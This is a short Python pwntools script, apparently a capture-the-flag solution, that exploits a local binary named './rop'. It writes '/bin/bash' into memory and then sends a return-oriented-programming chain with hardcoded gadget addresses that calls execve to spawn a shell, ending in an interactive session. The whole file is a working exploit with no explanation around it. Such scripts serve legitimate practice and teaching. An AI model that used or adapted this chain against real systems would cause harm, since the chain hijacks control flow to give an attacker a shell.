from pwn import *

context(os="linux", arch="amd64")

DEBUG = 1
LOCAL = 1

if (DEBUG):
	context.log_level = "debug"

g_filename = "./rop"
g_elf = ELF(g_filename)

if (LOCAL):
	g_io = process(g_filename)
else:
	g_io = remote()

def getpid():
	if (LOCAL & DEBUG):
		print(g_io.proc.pid)
		pause()

def pwn():
	payload_overwrite = flat([
		'a'*16,
		b"/bin/bash\x00"
	])
	g_io.sendlineafter("you?\n", payload_overwrite)
	
	getpid()
	
	pop_rdi = 0x400813
	pop_rsi_r15 = 0x400811
	#pop_rdx = 0x
	
	payload_hijack = flat([
		'a'*(8 + 8),
		pop_rdi, 0x601060,
		pop_rsi_r15, 0, 0,
		#pop_rdx, 0
		g_elf.plt["execve"]
	])
	g_io.sendlineafter("do?\n", payload_hijack)

if "__main__" == __name__:
	pwn()
	g_io.interactive()
